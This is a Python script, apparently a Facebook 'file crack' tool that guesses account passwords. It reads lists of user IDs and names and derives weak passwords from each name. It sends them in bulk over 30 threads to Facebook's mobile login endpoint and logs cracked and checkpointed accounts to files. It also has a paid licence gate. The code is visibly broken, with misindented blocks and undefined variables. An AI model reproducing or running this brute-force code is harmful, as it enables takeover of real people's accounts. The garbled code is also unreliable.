import os
try:
    import requests
except ImportError:
    print('\n Module requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n Module futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n Module bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
from concurrent.futures import ThreadPoolExecutor as KINGNASEER
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  CHIGOZIEWORLDWIDE.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36;"
"Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/113.0;"
"Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:113.0) Gecko/113.0 Firefox/113.0;"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}Ã¢â¬Â¢{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(0.5)
done = True

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

# LO KONTOL
def logo():
	print("""
 
      ######## \033[1;97m##     ## \033[1;92m########
         ##    \033[1;97m##     ## \033[1;92m##
         ##    \033[1;97m##     ## \033[1;92m##
         ##    \033[1;97m######### \033[1;92m######
         ##    \033[1;97m##     ## \033[1;92m##
         ##    \033[1;97m##     ## \033[1;92m##
         ##    \033[1;97m##     ## \033[1;92m########
         
         
 \033[1;97m░█▀▄░█░░░█▀█░█▀▀░█░█░░░█▀▀░█░█░█▀█░█▀▀░▀█▀░░
 \033[1;97m░█▀▄░█░░░█▀█░█░░░█▀▄░░░█░█░█▀█░█░█░▀▀█░░█░░░
 \033[1;97m░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░░
 
==================================================
           CODED BY : HAMIM UDDIN JISAN        
           WHATSAPP : +8801814649133    
           FB PAGE  : ITZ JISAN   
==================================================           
              \x1b[1;41m\x1b[1;97mX1X4D-2-0 BR4ND \x1b[1;0m""")

def reg():
    os.system('clear')
    logo()
    print ('')
    time.sleep(0.001) 
    try:
        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt').text
    if to in r:
        time.sleep(2)
        python_java()
    else:
        os.system('clear')
        logo()
        print('')
        print ('\tApproved Not Detected')
        print ('')
        print (' \033[1;97mToken: ' + to)
        print(' Facebook : Itz Jisan Xhowdhury ')
        input('\033[1;97m Press Enter To Get Approval \033[1;92m(FOR FREE)')
        os.system("xdg-open https://www.facebook.com/TurRealabbu1")
        reg()

def reg2():
    os.system('clear')
    logo()
    print('')
    print ('\tApproval Not Detected')
    print('')
    id = uuid.uuid4().hex[:50]
    print (' Token : ' + id)
    print(' Facebook : ITZ JISAN XHOWDHURY')
    input(' Press Enter To Get Approval \033[1;92m(PAID) ')
    os.system("xdg-open https://www.facebook.com/TurRealabbu1")
    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
    sav.write(id)
    sav.close()
    reg()



#MASUK TOKEN
def THEMOHSIN (OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' Crack Has Been Completed.')
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;92m SUCCESSFULL : %s --- \033[1;97m/sdcard/JISAN-OK.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;92m CHECKPOINTS : %s --- \033[1;97m/sdcard/JISAN-Cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Return To Main Menu ")
        python_java()

def python_java():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;92m               B L 4 C K G H O S T")
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;97m IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;94m             Dont Play With Me !")
    print(" \033[1;94m             Because I know I Can")
    print(" \033[1;94m                PLAY Better Than You")
    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
    print("\033[1;97m [1] FILE CRACK")
    print("\033[1;91m [0] EXIT")
    print("")
    pepek = input('\033[1;97m Select : ')
    if pepek in['1','01']:
       __xyz__().janu(id)
            

class __xyz__:

    def __init__(self):
        self.id = []

    def janu(self,id):
        os.system('clear')
        logo()
        print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
        print("              FILE CRACK MENU")
        print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
        print('')
        self.cnt = input('%s  ENTER FILE PATH :%s '%(P,K))
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        input('%s  Press ENTER IF YOU WANT TO COUNTINUE PROCESS :%s '%(P,K))
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            os.system('clear')
            logo()
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print("\033[1;91              SELECT METHOD")
            print(" \033[1;92m ---------------------------------------------");time.sleep(0.03)
            print('')
            print(' [1] Method 1 (Best)')
            print(' [2] Method 2 (Fire)')
            chi = input('  Choose method: ')
            self.__pler__()
        else:
            print(' WRONG INPUT ');self.janu(id)
    def __metode__(self, user, __chi__, chachaji):
        global ok,cp,loop
        sys.stdout.write(f'\r [BL4CK GHOST] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
header_freefb = {"authority": 'mbasic.facebook.com',
                "method": 'GET',
                "scheme": 'https',
                "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                "accept-encoding": 'gzip, deflate, br',
                "accept-language": 'en-US,en;q=1',
                'cache-control': 'no-cache, no-store, must-revalidate',
                "referer": 'https://t.facebook.com/',
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": '?1',
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": 'document',
                "sec-fetch-mode": 'navigate',
                "sec-fetch-site": 'same-origin',
                "sec-fetch-user": '?0',
                "pragma": 'no-cache',
                "priority": 'u=0',
                'cross-origin-resource-policy': 'cross-origin',
                "upgrade-insecure-requests": '1',
                "user-agent": pro}
                lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
header_freefb = {"authority": 'mbasic.facebook.com',
                "method": 'GET',
                "scheme": 'https',
                "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                "accept-encoding": 'gzip, deflate, br',
                "accept-language": 'en-US,en;q=1',
                'cache-control': 'no-cache, no-store, must-revalidate',
                "referer": 'https://t.facebook.com/',
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": '?1',
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": 'document',
                "sec-fetch-mode": 'navigate',
                "sec-fetch-site": 'same-origin',
                "sec-fetch-user": '?0',
                "pragma": 'no-cache',
                "priority": 'u=0',
                'cross-origin-resource-policy': 'cross-origin',
                "upgrade-insecure-requests": '1',
                "user-agent": pro}
                lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [JISAN-OK] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/JISAN-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;94m[JISAN-Cp] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/JISAN-Cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;94m[JISAN-Cp] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('/sdcard/JISAN-Cp.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, chachaji)
    def __pler__(self):
        chi = ('2')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;49;39m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;93m USE FLIGHT MODE IF SPEED ARE SLOW ')
            print(' \033[1;92m IN THE BACKGROUND ')
            print('-------------------------------------------')
            print('')
            with KINGNASEER(max_workers=30) as kirim:
                for thankme in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = thankme.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            BL4CK-GHOST(OK,cp)
        elif chi in ('2', '02'):

            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;91m USE FLIGHT MODE IF SPEED ARE SELOW')
            print(' \033[1;92m CRACK HAS BEEN STARTED')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print('')
            with KINGNASEER(max_workers=30) as kirim:
                for thankme in self.id: # CHECK_THE_POWER_OF_YOUR_DAD_JISAN
                    try:
                        uid, name = thankme.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        kirim.submit(self.__metode__, uid, pwx, "x.facebook.com")
                    except:
                        pass

            BL4CK-GHOST(OK,cp)
        else:
            print('\n Select Valid One');self.__pler__()


if __name__ == '__main__':
    reg()

